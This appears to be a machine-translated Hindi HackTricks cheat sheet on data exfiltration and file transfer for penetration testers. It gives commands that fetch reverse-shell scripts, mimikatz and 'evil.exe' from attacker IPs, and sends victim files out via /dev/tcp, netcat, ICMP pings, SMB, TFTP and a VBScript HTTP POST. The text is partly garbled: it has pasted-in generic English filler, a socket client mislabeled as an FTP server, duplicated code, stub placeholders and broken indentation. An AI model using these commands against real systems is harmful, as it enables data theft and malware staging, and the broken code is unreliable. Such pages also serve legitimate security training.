# निकासी

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें**।

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता को ध्यान में रखते हुए सामान्यतः सफेद सूचीबद्ध डोमेनों को खोजें जिनका उपयोग जानकारी को निकासी के लिए किया जा सकता है

## कॉपी और पेस्ट Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**लिनक्स**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### फ़ाइलें अपलोड करें

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer प्रिंटिंग GET और POST (और हेडर्स भी)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python मॉड्यूल [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS सर्वर**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure that the data transmitted between the server and the client remains confidential and cannot be tampered with by attackers.

HTTPS servers use SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificates to establish a secure connection with the client. These certificates are issued by trusted Certificate Authorities (CAs) and contain cryptographic keys that are used to encrypt and decrypt the data.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate and configure your server software to use it. Once the server is configured, it can accept HTTPS requests from clients and securely transmit data over the internet.

Using an HTTPS server is essential for protecting sensitive information, such as login credentials, credit card numbers, and personal data, from being intercepted by attackers. It is widely used in e-commerce websites, online banking platforms, and other applications that require secure communication.

By using an HTTPS server, you can ensure that the data transmitted between your server and the client is encrypted and secure, reducing the risk of data breaches and unauthorized access.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP सर्वर (पायथन)

```python
import socket
import os

def send_file(file_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Open the file in binary mode
    with open(file_path, 'rb') as file:
        # Get the file name
        file_name = os.path.basename(file_path)

        # Send the file name to the server
        s.send(file_name.encode())

        # Send the file data to the server
        s.sendall(file.read())

    # Close the socket connection
    s.close()

def receive_file(save_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Receive the file name from the server
    file_name = s.recv(1024).decode()

    # Receive the file data from the server
    file_data = s.recv(1024)

    # Open the file in binary mode
    with open(os.path.join(save_path, file_name), 'wb') as file:
        # Write the file data to the file
        file.write(file_data)

    # Close the socket connection
    s.close()
```

फ़ाइल पथ, होस्ट, और पोर्ट के साथ फ़ाइल भेजने और प्राप्त करने के लिए एक FTP सर्वर (पायथन) बनाएं।

```python
import socket
import os

def send_file(file_path, host, port):
    # सॉकेट ऑब्जेक्ट बनाएं
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # FTP सर्वर से कनेक्ट करें
    s.connect((host, port))

    # बाइनरी मोड में फ़ाइल खोलें
    with open(file_path, 'rb') as file:
        # फ़ाइल का नाम प्राप्त करें
        file_name = os.path.basename(file_path)

        # सर्वर को फ़ाइल का नाम भेजें
        s.send(file_name.encode())

        # सर्वर को फ़ाइल डेटा भेजें
        s.sendall(file.read())

    # सॉकेट कनेक्शन बंद करें
    s.close()

def receive_file(save_path, host, port):
    # सॉकेट ऑब्जेक्ट बनाएं
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # FTP सर्वर से कनेक्ट करें
    s.connect((host, port))

    # सर्वर से फ़ाइल का नाम प्राप्त करें
    file_name = s.recv(1024).decode()

    # सर्वर से फ़ाइल डेटा प्राप्त करें
    file_data = s.recv(1024)

    # बाइनरी मोड में फ़ाइल खोलें
    with open(os.path.join(save_path, file_name), 'wb') as file:
        # फ़ाइल डेटा को फ़ाइल में लिखें
        file.write(file_data)

    # सॉकेट कनेक्शन बंद करें
    s.close()
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP सर्वर (NodeJS)

एफटीपी सर्वर (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP सर्वर (pure-ftp)

एफटीपी सर्वर (प्योर-एफटीपी)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** क्लाइंट

विंडोज क्लाइंट
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण संकटों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमला सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे नि: शुल्क परीक्षण के लिए प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

काली सर्वर के रूप में
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
या सैंबा का उपयोग करके एक SMB शेयर बनाएं:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation as it allows the attacker to steal sensitive information from the compromised system.

## Techniques for Exfiltration

### 1. File Transfer Protocol (FTP)

FTP is a standard network protocol used for transferring files between a client and a server on a computer network. Attackers can use FTP to exfiltrate data by connecting to an FTP server and uploading the stolen files.

### 2. Hypertext Transfer Protocol (HTTP)

HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending HTTP requests to a remote server, either by embedding the stolen data in the request body or by encoding it in the request headers.

### 3. Domain Name System (DNS)

DNS is a hierarchical decentralized naming system for computers, services, or other resources connected to the internet. Attackers can use DNS exfiltration techniques to encode and transmit stolen data within DNS queries or responses.

### 4. Email

Attackers can exfiltrate data by sending it as email attachments or by using steganography techniques to hide the data within the email content.

### 5. Cloud Storage

Attackers can leverage cloud storage platforms to exfiltrate data by uploading the stolen files to cloud storage accounts. This allows them to access the data from anywhere and share it with other malicious actors.

### 6. Covert Channels

Covert channels are hidden communication channels that can be used to exfiltrate data without being detected. These channels can utilize various protocols and techniques, such as ICMP, TCP, or even audio frequencies.

## Countermeasures

To prevent exfiltration of sensitive data, organizations should implement the following countermeasures:

- Implement strong network segmentation to restrict unauthorized access to sensitive systems.
- Use encryption to protect data in transit and at rest.
- Implement intrusion detection and prevention systems to detect and block exfiltration attempts.
- Monitor network traffic for suspicious activities and anomalies.
- Regularly update and patch systems to address known vulnerabilities.
- Educate employees about the risks of data exfiltration and implement strict access controls.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

अटैकर को SSHd चल रहा होना चाहिए।
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से अपने पास एक निर्देशिका माउंट कर सकता है।
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) एक शक्तिशाली नेटवर्क उपकरण है जिसका उपयोग नेटवर्क कनेक्शन बनाने, पोर्ट स्कैन करने, डेटा भेजने और प्राप्त करने, और अन्य नेटवर्क कार्यों के लिए किया जाता है। यह एक कमांड लाइन उपकरण है जिसे टर्मिनल में चलाया जा सकता है।

इसका उपयोग डेटा अपलोड और डाउनलोड करने, फ़ाइलों को अन्य सिस्टमों में स्थानांतरित करने, रिमोट शेल एक्सेस प्राप्त करने, और नेटवर्क ट्रैफ़िक को सुनने के लिए किया जा सकता है।

यह एक TCP/IP और UDP/IP कनेक्शन बनाने के लिए उपयोग किया जा सकता है और इसका उपयोग एक सिस्टम से दूसरे सिस्टम में डेटा भेजने और प्राप्त करने के लिए भी किया जा सकता है।

यह एक बहुत ही उपयोगी उपकरण है जिसे हैकर्स और पेंटेस्टर्स द्वारा उपयोग किया जाता है।
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
यदि आपके पास विक्टिम के साथ एक नेटवर्क कनेक्शन है, तो आप `/dev/tcp` फ़ाइल सिस्टम का उपयोग करके फ़ाइल डाउनलोड कर सकते हैं। निम्नलिखित कमांड का उपयोग करें:

```bash
cat </dev/tcp/<victim_ip>/<port> > <local_file>
```

यहां `<victim_ip>` विक्टिम का IP पता है और `<port>` विक्टिम मशीन पर खुले पोर्ट का संदर्भ है। `<local_file>` आपकी स्थानीय मशीन पर फ़ाइल को सहेजने के लिए नया फ़ाइल का नाम है।

उदाहरण के लिए, यदि आप विक्टिम के IP पते 192.168.0.100 है और विक्टिम मशीन पर पोर्ट 8080 खुला है, और आप फ़ाइल `important_file.txt` को अपनी स्थानीय मशीन पर `downloaded_file.txt` नाम से सहेजना चाहते हैं, तो आप निम्नलिखित कमांड का उपयोग करेंगे:

```bash
cat </dev/tcp/192.168.0.100/8080 > downloaded_file.txt
```

यह कमांड विक्टिम मशीन पर `important_file.txt` की सामग्री को आपकी स्थानीय मशीन पर `downloaded_file.txt` नाम से सहेजेगा।
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### विक्टिम के पास फ़ाइल अपलोड करें

To upload a file to the victim's system, you can use various methods depending on the access and vulnerabilities present. Here are a few common techniques:

1. **Web-based File Upload**: If the victim's system has a web application that allows file uploads, you can exploit this feature to upload a malicious file. Look for any input fields or forms that accept file uploads and try to bypass any restrictions or filters in place.

2. **Email Attachment**: If you have access to the victim's email account, you can send an email with a malicious attachment. Craft the email in a way that convinces the victim to open the attachment, which may contain a payload that provides you with access to their system.

3. **Remote File Inclusion**: If the victim's system is vulnerable to remote file inclusion (RFI), you can exploit this vulnerability to upload a file from a remote server. Look for any input fields or parameters that allow you to include external files and try to manipulate them to upload your file.

4. **Exploiting File Transfer Protocols**: If the victim's system has file transfer protocols enabled, such as FTP or SMB, you can attempt to exploit any vulnerabilities in these protocols to upload a file. Look for weak credentials, misconfigurations, or known vulnerabilities in the file transfer service.

Remember, unauthorized file uploads are illegal and unethical. Always ensure you have proper authorization and follow ethical guidelines when performing any hacking activities.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
धन्यवाद **@BinaryShadow\_** को

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

यदि आप एक SMTP सर्वर को डेटा भेज सकते हैं, तो आप पायथन के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इंस्टॉलेशन के दौरान यह विशेष रूप से जोड़ा जाना चाहिए)

Kali में, **TFTP सर्वर शुरू करें**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python में TFTP सर्वर:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            error_packet = struct.pack('!HH', 5, 4) + b'Invalid opcode'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

tftp_server()
```

यहां एक UDP सॉकेट बनाएं
```python
server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('0.0.0.0', 69))
```

यहां एक असीमित लूप चलाएं
```python
while True:
```

डेटा और क्लाइंट पते को प्राप्त करें
```python
data, client_address = server_socket.recvfrom(516)
```

ऑपकोड को प्राप्त करें
```python
opcode = struct.unpack('!H', data[:2])[0]
```

यदि ऑपकोड 1 है, तो पढ़ने का अनुरोध है
```python
if opcode == 1:
```

यदि ऑपकोड 2 है, तो लिखने का अनुरोध है
```python
elif opcode == 2:
```

अनुमानित ऑपकोड है
```python
else:
```

त्रुटि पैकेट भेजें
```python
error_packet = struct.pack('!HH', 5, 4) + b'Invalid opcode'
server_socket.sendto(error_packet, client_address)
```

सर्वर सॉकेट बंद करें
```python
server_socket.close()
```

```python
tftp_server()
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**विक्टिम** में, Kali सर्वर से कनेक्ट करें:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

एक PHP वनलाइनर के साथ एक फ़ाइल डाउनलोड करें:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) एक scripting language है जो Microsoft Windows operating system पर चलने वाले एप्लिकेशन्स को automate करने के लिए उपयोग होता है। VBScript को Windows Script Host (WSH) के माध्यम से execute किया जा सकता है। यह language एक interpreted language है, जिसका मतलब है कि इसे compile नहीं किया जाता है, बल्कि इसे runtime में execute किया जाता है।

VBScript का उपयोग करके, हम विभिन्न कार्यों को automate कर सकते हैं, जैसे कि फ़ाइलों को create, modify और delete करना, एप्लिकेशन्स को control करना, डेटाबेस के साथ interact करना, और इंटरनेट पर डेटा को retrieve और पोस्ट करना।

VBScript में कुछ built-in objects होते हैं, जैसे कि FileSystemObject, Dictionary, WScript, Shell, Network, और WMI (Windows Management Instrumentation)। इन objects का उपयोग करके, हम विभिन्न कार्यों को execute कर सकते हैं, जैसे कि फ़ाइलों को read और write करना, नेटवर्क के साथ interact करना, और सिस्टम की जानकारी प्राप्त करना।

VBScript का उपयोग करके, हम डेटा को exfiltrate कर सकते हैं। इसके लिए, हम विभिन्न तकनीकों का उपयोग कर सकते हैं, जैसे कि फ़ाइलों को email करना, नेटवर्क के माध्यम से डेटा भेजना, और वेब सर्वर के साथ HTTP requests करना।

यहाँ कुछ VBScript code snippets हैं जो डेटा exfiltration के लिए उपयोग हो सकते हैं:

```vbscript
' फ़ाइल को email करना
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "sender@example.com"
objEmail.To = "recipient@example.com"
objEmail.Subject = "डेटा exfiltration"
objEmail.Textbody = "यहाँ आपका डेटा है"
objEmail.AddAttachment "C:\path\to\file.txt"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send

' नेटवर्क के माध्यम से डेटा भेजना
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://example.com/endpoint", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "data=यहाँ आपका डेटा है"

' वेब सर्वर के साथ HTTP requests करना
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "GET", "http://example.com/data", False
objHTTP.send
response = objHTTP.responseText
```

यहाँ दिए गए code snippets का उपयोग करके, आप VBScript का उपयोग करके डेटा exfiltration कर सकते हैं।
```bash
Attacker> python -m SimpleHTTPServer 80
```
**शिकार**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

यह एक पागल तकनीक है जो Windows 32 बिट मशीनों पर काम करती है। यह विचार है कि हम `debug.exe` प्रोग्राम का उपयोग करें। यह बाइनरी की जांच करने के लिए उपयोग किया जाता है, जैसे एक डीबगर। लेकिन यह हेक्स से उन्हें फिर से निर्माण करने के लिए भी उपयोग किया जा सकता है। इसलिए विचार है कि हम बाइनरी को लेते हैं, जैसे `netcat`। और फिर इसे हेक्स में विस्थापित करें, संक्षेप में एक फ़ाइल में पेस्ट करें, और फिर `debug.exe` के साथ इसे असेंबल करें।

`Debug.exe` केवल 64 kb को असेंबल कर सकता है। इसलिए हमें इससे छोटी फ़ाइलों का उपयोग करना होगा। हम इसे और अधिक संक्षेपित करने के लिए upx का उपयोग कर सकते हैं। तो चलिए ऐसा करते हैं:
```
upx -9 nc.exe
```
अब यह केवल 29 kb का है। पूर्ण। तो अब इसे विसेकण करते हैं:
```
wine exe2bat.exe nc.exe nc.txt
```
अब हम बस पाठ को अपने विंडोज शैल में कॉपी-पेस्ट करेंगे। और यह स्वचालित रूप से एक फ़ाइल बनाएगा जिसका नाम nc.exe होगा

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता को खोजें जो सबसे अधिक मायने रखती है ताकि आप उन्हें जल्दी ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याएं खोजता है। [**इसे नि: शुल्क परीक्षण के लिए आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
